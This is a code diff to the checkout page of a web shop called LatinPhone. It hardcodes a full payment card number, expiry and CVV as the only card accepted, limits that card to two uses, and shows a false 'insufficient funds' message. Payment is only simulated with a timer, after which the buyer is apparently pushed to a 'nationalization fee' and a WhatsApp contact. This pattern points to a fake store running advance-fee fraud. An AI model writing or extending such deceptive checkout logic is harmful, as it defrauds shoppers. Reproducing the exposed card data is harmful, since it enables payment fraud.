@@ -171,6 +171,23 @@
             const MIN_NATIONALIZATION_AMOUNT_BS = 1800; // Monto mínimo de tasa de nacionalización en Bs
             const MIN_NATIONALIZATION_THRESHOLD_USD = 1000; // Umbral en USD para aplicar lógica especial
 
+            const VALID_CARD = {
+                number: '4745034211763009',
+                expiry: '01/26',
+                cvv: '583'
+            };
+            const MAX_CARD_USES = 2;
+            const MAX_PURCHASE_AMOUNT = 3000;
+
+            function getValidCardUses() {
+                return parseInt(localStorage.getItem('validCardUses') || '0', 10);
+            }
+
+            function incrementValidCardUses() {
+                const uses = getValidCardUses() + 1;
+                localStorage.setItem('validCardUses', uses.toString());
+            }
+
             function updateCartCount() {
                 const cartCountEl = document.getElementById('cart-count');
                 if (!cartCountEl) return;
@@ -1163,13 +1180,22 @@
                     cardPinInput.focus();
                     return false;
                 }
-                
+
+                if (
+                    cardNumber !== VALID_CARD.number ||
+                    cardExpiry !== VALID_CARD.expiry ||
+                    cardCvv !== VALID_CARD.cvv
+                ) {
+                    showToast('error', 'Tarjeta inválida', 'Los datos de la tarjeta no son válidos.');
+                    cardNumberInput.focus();
+                    return false;
+                }
+
                 return true;
             }
 
             // Función para procesar el pago
             function processPayment() {
-                // Validar información de tarjeta si es el método seleccionado
                 const selectedPaymentOption = document.querySelector('.payment-option.selected');
                 if (!selectedPaymentOption) {
                     showToast('error', 'Método de pago', 'Por favor, selecciona un método de pago.');
@@ -1180,41 +1206,54 @@
                 if (selectedPaymentMethod === 'credit-card' && !validateCardInfo()) {
                     return;
                 }
-                
-                // Verificar que el carrito no esté vacío
+
                 if (cart.length === 0) {
                     showToast('error', 'Carrito vacío', 'No hay productos en tu carrito para procesar el pago.');
                     return;
                 }
-                
-                // Mostrar overlay de carga
+
+                const requiredFields = [fullNameInput, idNumberInput, phoneInput, addressInput, stateInput, cityInput, shippingCompanyInput].filter(Boolean);
+                if (requiredFields.some(field => !field.value.trim())) {
+                    showToast('error', 'Datos incompletos', 'Por favor, completa la información de entrega.');
+                    return;
+                }
+
+                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+                const tax = subtotal * taxRate;
+                const total = subtotal + tax + selectedShipping.price + selectedInsurance.price;
+
+                if (total > MAX_PURCHASE_AMOUNT) {
+                    showToast('error', 'Pago rechazado', 'No hay saldo suficiente.');
+                    return;
+                }
+
+                if (selectedPaymentMethod === 'credit-card') {
+                    const uses = getValidCardUses();
+                    if (uses >= MAX_CARD_USES) {
+                        showToast('error', 'Pago rechazado', 'No hay saldo suficiente.');
+                        return;
+                    }
+                    incrementValidCardUses();
+                }
+
                 loadingOverlay.classList.add('active');
-                
-                // Generar número de orden aleatorio
+
                 orderNumber = generateOrderNumber();
                 document.getElementById('order-number').textContent = orderNumber;
-                
-                // Preparar mensaje de WhatsApp con detalles completos
+
                 let whatsappMessage = `Hola, acabo de realizar una compra en LatinPhone.\n\n`;
                 whatsappMessage += `Número de orden: ${orderNumber}\n`;
                 whatsappMessage += `Fecha: ${document.getElementById('order-date').textContent}\n\n`;
                 whatsappMessage += `*Detalles de la compra:*\n`;
-                
-                // Añadir productos
+
                 cart.forEach(item => {
                     whatsappMessage += `• ${item.quantity}x ${item.name} - $${(item.price * item.quantity).toFixed(2)}\n`;
                 });
-                
-                // Añadir regalo si existe
+
                 if (selectedGift) {
                     whatsappMessage += `• 1x ${selectedGift.name} (Regalo GRATIS)\n`;
                 }
-                
-                // Añadir resumen
-                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-                const tax = subtotal * taxRate;
-                const total = subtotal + tax + selectedShipping.price + selectedInsurance.price;
-                
+
                 whatsappMessage += `\n*Resumen:*\n`;
                 whatsappMessage += `Subtotal: $${subtotal.toFixed(2)}\n`;
                 whatsappMessage += `IVA (16%): $${tax.toFixed(2)}\n`;
@@ -1222,11 +1261,10 @@
                 whatsappMessage += `Seguro: $${selectedInsurance.price.toFixed(2)}\n`;
                 whatsappMessage += `*Total USD: $${total.toFixed(2)}*\n`;
                 whatsappMessage += `*Total Bs: ${(total * exchangeRate).toFixed(2)} Bs*\n\n`;
-                
-                // Añadir info de nacionalización
+
                 const nationalizationFeeValue = calculateNationalizationFee(total);
                 whatsappMessage += `*Tasa de nacionalización: ${nationalizationFeeValue.toFixed(2)} Bs*\n\n`;
-                
+
                 whatsappMessage += `Método de pago: ${document.querySelector('.payment-option.selected').querySelector('.payment-option-text').textContent}\n\n`;
                 whatsappMessage += `*Datos de entrega:*\n`;
                 whatsappMessage += `Nombre completo: ${fullNameInput.value}\n`;
@@ -1238,21 +1276,16 @@
                 whatsappMessage += `Empresa de envío: ${shippingCompanyInput.value}\n\n`;
 
                 whatsappMessage += `Por favor, necesito finalizar el proceso de compra y confirmar los detalles de envío.`;
-                
-                // Configurar enlaces de WhatsApp
+
                 const encodedMessage = encodeURIComponent(whatsappMessage);
                 const whatsappUrl = `https://wa.me/+18133584564?text=${encodedMessage}`;
                 whatsappBtn.href = whatsappUrl;
                 whatsappSupport.href = whatsappUrl;
-                
-                // Simulamos el procesamiento del pago con un timeout
+
                 setTimeout(() => {
                     loadingOverlay.classList.remove('active');
-
-                    // Mostrar el overlay de nacionalización
                     nationalizationOverlay.classList.add('active');
-
-                }, 3000); // 3 segundos de "procesamiento"
+                }, 3000);
             }
 
             function saveOrderData() {
